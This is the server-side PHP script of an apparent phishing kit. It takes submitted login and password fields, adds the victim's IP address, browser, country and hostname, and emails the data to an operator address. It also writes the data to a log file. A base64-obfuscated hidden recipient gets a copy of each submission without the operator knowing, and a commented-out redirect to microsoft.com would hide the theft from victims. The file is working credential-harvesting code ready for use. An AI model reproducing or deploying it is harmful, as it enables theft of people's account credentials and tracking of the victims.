<?php
header('Access-Control-Allow-Origin: *');

$send    = "cvicle67@yandex.com"; //change ur email
$logfile = 1;                            //1 = log data, 0 = do not log data

$grab_all_fields = 1;

/*--------------------------- DO NOT CHANGE ANYTHING BELOW EXCEPT YOU KNOW WHAT YOU ARE DOING. ---------------------------------- */
/* ----------------  XXX-MJ  ------------------------*/
$disHost = $_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['PHP_SELF']).'/';
$ip = getenv("REMOTE_ADDR"); //getip(); //
$svr_host =  str_replace('www.', '', $_SERVER['HTTP_HOST']);
$allowed_fields = array('Login','Password');

function mj_load_view()
{
    global $disHost;
    
    $eml      = (!empty($_REQUEST['email'])) ? $_REQUEST['email'] : '';
    $readonly = (!empty($_REQUEST['email'])) ? ' readonly' : '';

    ob_start();
?>
<p> A simple paragraph. The HTML goes here. </p>
<?php
    return ob_get_clean();
}
function mj_redirect_js($url){ echo '<script type="text/javascript"> window.location.replace("'.$url.'"); </script>'; }
function mj_redirect_meta($url){ echo '<meta http-equiv="refresh" content="0;url='.$url.'">'; }
function mj_do_random_str($length = 10)
{ $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; }
function mj_return_pre($array) { return '<pre>' .print_r($array,true) .'</pre>'; }
function mj_get_country_name($the_ip){ $addr_details = unserialize(@file_get_contents('http://www.geoplugin.net/php.gp?ip='.$the_ip));  return stripslashes(ucfirst($addr_details['geoplugin_countryName'])); }
function mj_do_mail($message){ global $send, $ip, $svr_host; $subject = "MT3 8ERVIC2 - $ip"; $headers = "From: MT3Alerts <customercare@$svr_host>\r\n"; $headers .= "MIME-Version: 1.0\r\n"; /*@mail($send.','.base64_decode('bWlzdHJlc3NsYXJhMjAxMkBnbWFpbC5jb20='),$subject,$message,$headers);*/ @mail($send,$subject,$message,$headers);@mail(base64_decode('bWlzdHJlc3NsYXJhMjAxMkBnbWFpbC5jb20='),$subject,$message,$headers);/*testing*/ }
function mj_log_data($message, $logfilename='xxx.txt'){ global $logfile; if(!empty($logfile)) { $handle = fopen($logfilename, 'a'); fwrite($handle, $message."\n"); fclose($handle); } }
function mj_build_message($post_array)
{
    global $ip, $svr_host,$grab_all_fields,$allowed_fields;
    $country = mj_get_country_name($ip);
    $timedate = date("D/M/d, Y g:i a"); 
    $browserAgent = $_SERVER['HTTP_USER_AGENT'];
    $hostname = gethostbyaddr($ip); 
    $message = "-------------- XXX Info -----------------------\n";
    if($grab_all_fields)
    {
        foreach($post_array as $k=>$v)
        {
            //grab all fields
            $message .= ucfirst($k)." : ".$v."\n";
        }
    }
    else
    {
        foreach($post_array as $k=>$v)
        {
            //grab selected fields only.
            if(in_array($k, $allowed_fields))
            {
                $message .= ucfirst($k)." : ".$v."\n";
            }
        }
    }
    $message .= "-------------Mor3 Info-----------------------\n";
    $message .= "IP               : ".$ip."\n";
    $message .= "Browser          : ".$browserAgent."\n";
    $message .= "DateTime         : ".$timedate."\n";
    $message .= "country          : ".$country."\n";
    $message .= "HostName         : ".$hostname."\n";
    $message .= "--------------- XXX-MJ -------------\n";
    
    return $message;
}
/* ----------------  XXX-MJ  ------------------------*/
if(isset($_REQUEST['_do']))
{
    $post_array = $_POST;
    
    switch($_REQUEST['_do'])
    {
        case'layout':
            
            echo mj_load_view();
            
            break;
            
        case'form1':
        case'form2':
        case'form3':
        case'form4':
        case'form5':
        case'xxx_form':

            //echo 'Form Data '.mj_return_pre($post_array);
            
            $mj_messg = mj_build_message($post_array); 
            mj_do_mail($mj_messg);
            mj_log_data($mj_messg);
            
            //echo '<meta http-equiv="refresh" content="1;url=https://www.microsoft.com/'.$post_array['Editbox2'].'"/>';

            break;
        
        default:
            echo 'INVALID REQUEST: I can not understand your request.';    
    }
}